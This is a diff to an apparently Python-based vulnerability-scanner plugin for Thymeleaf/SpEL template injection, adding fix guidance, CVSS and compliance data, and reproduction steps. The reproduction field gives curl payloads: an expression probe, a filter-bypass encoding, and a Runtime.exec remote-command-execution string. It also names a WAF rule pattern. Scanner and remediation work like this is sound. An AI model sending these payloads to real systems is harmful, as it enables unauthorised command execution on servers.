@@ -8,7 +8,7 @@ from urllib.parse import quote
 
 class ThymeleafSstiPlugin(PluginBase):
     name = 'Thymeleaf/SpEL 模板注入'
-    cve = ''
+    cve = 'CVE-2023-38286'
     severity = 'high'
     category = 'vuln'
     description = (
@@ -19,6 +19,41 @@ class ThymeleafSstiPlugin(PluginBase):
         '禁止将用户可控路径直接作为视图名；使用 @Controller + @ResponseBody 显式标注；'
         '升级 Spring/Thymeleaf 修复 CVE-2023-38286 等已知漏洞；URL 白名单路由'
     )
+    fix_detail = (
+        '【升级方案】升级 Thymeleaf 至 3.1.2.RELEASE+（修复 CVE-2023-38286）\n'
+        '  pom.xml: <thymeleaf.version>3.1.2.RELEASE</thymeleaf.version>\n'
+        '【代码修复】所有 Controller 方法用 @ResponseBody 或 @RestController 显式标注，避免返回视图名：\n'
+        '  @RestController  // 整个类都返回 JSON，不走视图解析\n'
+        '  public class ApiController { ... }\n'
+        '【代码修复】禁止 Controller 返回用户可控路径：\n'
+        '  - 错误：return "redirect:" + userInput;\n'
+        '  - 正确：return "redirect:/fixed/path";\n'
+        '【配置加固】Spring Security 添加 URL 白名单：\n'
+        '  .anyRequest().authenticated()  // 默认拒绝未匹配请求\n'
+        '【WAF 规则】拦截 URL 路径含 __${ 或 __*{ 的请求（Thymeleaf 表达式特征）\n'
+        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验'
+    )
+    reproduce = (
+        '# 1. 探针：发送 __${7*7}__::.x 作为路径，检查响应是否含 49：\n'
+        'curl -i "http://target/__${7*7}__::.x"\n'
+        '\n'
+        '# 2. 使用 URL 编码绕过部分过滤：\n'
+        'curl -i "http://target/__%24%7B7*7%7D__::.x"\n'
+        '\n'
+        '# 预期响应：HTTP 500/404 错误页面或响应体含 "49" 字样（表达式已求值）\n'
+        '\n'
+        '# 3. 进阶利用（仅授权测试，执行 id 命令）：\n'
+        'curl -i "http://target/__${T(java.lang.Runtime).getRuntime().exec(\'id\')}__::.x"\n'
+        '  # 响应会执行 id 命令，需结合响应时间或 OOB 验证'
+    )
+    # D2：Thymeleaf SSTI 全版本存在（取决于 Controller 是否返回用户可控视图名）
+    affected_versions = ''
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H'
+    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
+    # D7: WAF 绕过支持
+    vuln_type = 'rce'
+    supports_waf_bypass = True
 
     # 探针：__${7*7}__::.x 求值后 Thymeleaf 视图名变为 49（路径未配置时报错页含 49）
     # 不使用 Runtime.exec 类破坏性 payload（agents.md §7）
